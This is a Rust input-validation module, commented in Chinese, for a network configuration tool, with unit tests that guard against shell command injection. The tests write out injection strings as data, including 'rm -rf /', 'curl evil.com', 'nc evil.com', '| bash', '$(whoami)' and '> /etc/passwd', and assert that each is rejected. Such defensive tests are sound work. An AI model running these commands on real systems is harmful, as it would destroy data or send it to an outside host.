/*!
 * 输入验证模块
 * 
 * 提供严格的输入验证，防止注入攻击和无效输入
 */

use regex::Regex;
use lazy_static::lazy_static;

// 禁止的特殊字符（防止命令注入）
const FORBIDDEN_CHARS: &[char] = &[';', '|', '&', '$', '(', ')', '<', '>', '`', '"', '\'', '\n', '\r', '\\', '*', '?', '[', ']', '{', '}', '!'];

/// 验证错误
#[derive(Debug)]
pub struct ValidationError {
    pub message: String,
}

impl ValidationError {
    pub fn new(message: impl Into<String>) -> Self {
        Self {
            message: message.into(),
        }
    }
}

impl std::fmt::Display for ValidationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)
    }
}

impl std::error::Error for ValidationError {}

lazy_static! {
    /// Token 正则表达式：::后跟1-16位十六进制数字和冒号
    static ref TOKEN_REGEX: Regex = Regex::new(r"^::[0-9a-fA-F:]+$").expect("Token 正则表达式无效");
    
    /// 接口名称正则表达式：字母、数字、下划线、连字符
    static ref INTERFACE_REGEX: Regex = Regex::new(r"^[a-zA-Z0-9_-]+$").expect("接口名称正则表达式无效");
    
    /// 连接名称正则表达式：字母、数字、空格、下划线、连字符
    static ref CONNECTION_REGEX: Regex = Regex::new(r"^[a-zA-Z0-9_\- ]+$").expect("连接名称正则表达式无效");
}

/// 验证 Token 格式
/// 
/// Token 必须符合格式：::后跟十六进制数字和冒号
/// 
/// # 安全检查
/// - 长度限制：不超过 64 字符
/// - 格式验证：必须为 ::xxxx 格式
/// - 特殊字符检查：禁止 shell 特殊字符
/// 
/// # 示例
/// - 有效：::888, ::1, ::abc, ::FFFF, ::1234:5678
/// - 无效：888, ::, ::xyz, ::888; rm -rf /
pub fn validate_token(token: &str) -> Result<(), ValidationError> {
    // 1. 空值检查
    if token.is_empty() {
        return Err(ValidationError::new("Token 不能为空"));
    }
    
    // 2. 长度检查（防止缓冲区溢出）
    if token.len() > 64 {
        return Err(ValidationError::new(
            format!("Token 长度过长：{} 字符，最多 64 字符", token.len())
        ));
    }
    
    // 3. 格式检查
    if !TOKEN_REGEX.is_match(token) {
        return Err(ValidationError::new(
            format!("Token 格式无效：'{}' 必须为 ::xxxx 格式（仅包含十六进制和冒号）", token)
        ));
    }
    
    // 4. 特殊字符检查（防止命令注入）
    if token.chars().any(|c| FORBIDDEN_CHARS.contains(&c)) {
        return Err(ValidationError::new(
            "Token 包含非法字符，可能存在安全风险"
        ));
    }
    
    Ok(())
}

/// 验证网络接口名称
/// 
/// 接口名称只能包含字母、数字、下划线和连字符，长度不超过 32
/// 
/// # 安全检查
/// - 长度限制：不超过 32 字符
/// - 格式验证：仅字母、数字、下划线、连字符
/// - 特殊字符检查：禁止 shell 特殊字符
/// 
/// # 示例
/// - 有效：eth0, ens33, wlan0, br-lan
/// - 无效：eth 0, ens33!, eth0; reboot
pub fn validate_interface(interface: &str) -> Result<(), ValidationError> {
    // 1. 空值检查
    if interface.is_empty() {
        return Err(ValidationError::new("接口名称不能为空"));
    }
    
    // 2. 长度检查
    if interface.len() > 32 {
        return Err(ValidationError::new(
            format!("接口名称过长：'{}' 长度不能超过 32 个字符", interface)
        ));
    }
    
    // 3. 格式检查
    if !INTERFACE_REGEX.is_match(interface) {
        return Err(ValidationError::new(
            format!("接口名称无效：'{}' 只能包含字母、数字、下划线和连字符", interface)
        ));
    }
    
    // 4. 特殊字符检查（防止命令注入）
    if interface.chars().any(|c| FORBIDDEN_CHARS.contains(&c)) {
        return Err(ValidationError::new(
            "接口名称包含非法字符，可能存在安全风险"
        ));
    }
    
    Ok(())
}

/// 验证 NetworkManager 连接名称
/// 
/// 连接名称只能包含字母、数字、空格、下划线和连字符，长度不超过 128
/// 
/// # 安全检查
/// - 长度限制：不超过 128 字符
/// - 格式验证：仅字母、数字、空格、下划线、连字符
/// - 特殊字符检查：禁止 shell 特殊字符
/// 
/// # 示例
/// - 有效：Wired connection 1, WiFi-Home, My_Network
/// - 无效：Connection!, test; DROP TABLE
pub fn validate_connection_name(name: &str) -> Result<(), ValidationError> {
    // 1. 空值检查
    if name.is_empty() {
        return Err(ValidationError::new("连接名称不能为空"));
    }
    
    // 2. 长度检查
    if name.len() > 128 {
        return Err(ValidationError::new(
            format!("连接名称过长：'{}' 长度不能超过 128 个字符", name)
        ));
    }
    
    // 3. 格式检查
    if !CONNECTION_REGEX.is_match(name) {
        return Err(ValidationError::new(
            format!("连接名称无效：'{}' 只能包含字母、数字、空格、下划线和连字符", name)
        ));
    }
    
    // 4. 特殊字符检查（防止命令注入）
    if name.chars().any(|c| FORBIDDEN_CHARS.contains(&c)) {
        return Err(ValidationError::new(
            "连接名称包含非法字符，可能存在安全风险"
        ));
    }
    
    Ok(())
}

/// 验证隐私模式
/// 
/// 隐私模式只能是 0 或 2
/// - 0: 禁用临时 IPv6 地址
/// - 2: 启用临时 IPv6 地址优先出站
pub fn validate_privacy_mode(mode: u8) -> Result<(), ValidationError> {
    if mode != 0 && mode != 2 {
        return Err(ValidationError::new(
            format!("隐私模式无效：{} 只能是 0（禁用临时IPv6）或 2（启用临时IPv6）", mode)
        ));
    }
    Ok(())
}

/// 计算 Token 的位数
/// 
/// 通过计算十六进制字符数来确定 Token 占用的位数
/// 每个十六进制字符代表 4 位
/// 
/// # 示例
/// - `::888` → 12 位 (3 个十六进制字符)
/// - `::1234` → 16 位 (4 个十六进制字符)
/// - `::1234:5678` → 32 位 (8 个十六进制字符)
/// - `::1234:5678:abcd:ef01` → 64 位 (16 个十六进制字符)
pub fn calculate_token_bits(token: &str) -> u8 {
    // 去掉前导 ::
    let hex_part = token.trim_start_matches(':');
    
    // 计算十六进制字符数（忽略冒号）
    let hex_chars = hex_part.chars()
        .filter(|c| c.is_ascii_hexdigit())
        .count();
    
    (hex_chars * 4) as u8
}

/// 验证 Token 格式（增强版，支持后缀长度验证）
/// 
/// 在基本格式验证的基础上，可选地验证 Token 的位数是否符合预期
/// 
/// # 参数
/// - `token`: Token 字符串
/// - `expected_suffix_bits`: 期望的后缀位数（可选）
/// 
/// # 安全检查
/// - 所有基本验证（格式、长度、特殊字符）
/// - 可选的位数匹配验证
pub fn validate_token_with_length(
    token: &str, 
    expected_suffix_bits: Option<u8>
) -> Result<(), ValidationError> {
    // 1. 基本格式验证
    validate_token(token)?;
    
    // 2. 如果指定了后缀长度，验证长度匹配
    if let Some(bits) = expected_suffix_bits {
        let actual_bits = calculate_token_bits(token);
        
        // 允许一定的灵活性：实际位数应该 <= 期望位数
        if actual_bits > bits {
            return Err(ValidationError::new(
                format!("Token 长度过长：期望最多 {} 位，实际 {} 位", bits, actual_bits)
            ));
        }
    }
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_validate_token() {
        // 有效的 Token
        assert!(validate_token("::888").is_ok());
        assert!(validate_token("::1").is_ok());
        assert!(validate_token("::abc").is_ok());
        assert!(validate_token("::FFFF").is_ok());
        assert!(validate_token("::1234:5678").is_ok());
        
        // 无效的 Token - 格式错误
        assert!(validate_token("888").is_err());
        assert!(validate_token("::").is_err());
        assert!(validate_token("::xyz").is_err());
        assert!(validate_token("::88 8").is_err());
        
        // 无效的 Token - 命令注入尝试
        assert!(validate_token("::888; rm -rf /").is_err());
        assert!(validate_token("::888 && curl evil.com").is_err());
        assert!(validate_token("::888 | bash").is_err());
        assert!(validate_token("::888$(whoami)").is_err());
        assert!(validate_token("::888`id`").is_err());
        assert!(validate_token("::888 > /etc/passwd").is_err());
        
        // 无效的 Token - 长度过长
        let long_token = format!("::{}",  "a".repeat(100));
        assert!(validate_token(&long_token).is_err());
    }
    
    #[test]
    fn test_validate_interface() {
        // 有效的接口名称
        assert!(validate_interface("eth0").is_ok());
        assert!(validate_interface("ens33").is_ok());
        assert!(validate_interface("wlan0").is_ok());
        assert!(validate_interface("br-lan").is_ok());
        assert!(validate_interface("veth_test").is_ok());
        
        // 无效的接口名称 - 格式错误
        assert!(validate_interface("").is_err());
        assert!(validate_interface("eth 0").is_err());
        assert!(validate_interface("ens33!").is_err());
        
        // 无效的接口名称 - 命令注入尝试
        assert!(validate_interface("eth0; reboot").is_err());
        assert!(validate_interface("eth0 && rm -rf /").is_err());
        assert!(validate_interface("eth0|nc evil.com").is_err());
        assert!(validate_interface("eth0$(whoami)").is_err());
        assert!(validate_interface("eth0`id`").is_err());
        
        // 无效的接口名称 - 长度过长
        assert!(validate_interface("verylonginterfacenamethatexceedslimit").is_err());
    }
    
    #[test]
    fn test_validate_connection_name() {
        // 有效的连接名称
        assert!(validate_connection_name("Wired connection 1").is_ok());
        assert!(validate_connection_name("WiFi-Home").is_ok());
        assert!(validate_connection_name("My_Network").is_ok());
        
        // 无效的连接名称 - 格式错误
        assert!(validate_connection_name("").is_err());
        assert!(validate_connection_name("Connection!").is_err());
        
        // 无效的连接名称 - 命令注入尝试
        assert!(validate_connection_name("test; DROP TABLE users").is_err());
        assert!(validate_connection_name("test && curl evil.com").is_err());
        assert!(validate_connection_name("test | bash").is_err());
        assert!(validate_connection_name("test$(whoami)").is_err());
        assert!(validate_connection_name("test`id`").is_err());
        assert!(validate_connection_name("test > /etc/passwd").is_err());
        
        // 无效的连接名称 - 长度过长
        let long_name = "a".repeat(200);
        assert!(validate_connection_name(&long_name).is_err());
    }
    
    #[test]
    fn test_validate_privacy_mode() {
        // 有效的隐私模式
        assert!(validate_privacy_mode(0).is_ok());
        assert!(validate_privacy_mode(2).is_ok());
        
        // 无效的隐私模式
        assert!(validate_privacy_mode(1).is_err());
        assert!(validate_privacy_mode(3).is_err());
        assert!(validate_privacy_mode(255).is_err());
    }
    
    #[test]
    fn test_calculate_token_bits() {
        // 测试不同长度的 Token
        assert_eq!(calculate_token_bits("::888"), 12);
        assert_eq!(calculate_token_bits("::1"), 4);
        assert_eq!(calculate_token_bits("::1234"), 16);
        assert_eq!(calculate_token_bits("::abcd"), 16);
        assert_eq!(calculate_token_bits("::1234:5678"), 32);
        assert_eq!(calculate_token_bits("::1234:5678:abcd:ef01"), 64);
        assert_eq!(calculate_token_bits("::FFFF:FFFF:FFFF:FFFF"), 64);
    }
    
    #[test]
    fn test_validate_token_with_length() {
        // 有效：Token 位数符合预期
        assert!(validate_token_with_length("::888", Some(16)).is_ok());
        assert!(validate_token_with_length("::1234", Some(16)).is_ok());
        assert!(validate_token_with_length("::1234:5678", Some(32)).is_ok());
        assert!(validate_token_with_length("::1234:5678:abcd:ef01", Some(64)).is_ok());
        
        // 有效：不指定长度
        assert!(validate_token_with_length("::888", None).is_ok());
        assert!(validate_token_with_length("::1234:5678:abcd:ef01", None).is_ok());
        
        // 无效：Token 位数超过预期
        assert!(validate_token_with_length("::1234:5678", Some(16)).is_err());
        assert!(validate_token_with_length("::1234:5678:abcd:ef01", Some(32)).is_err());
    }
}
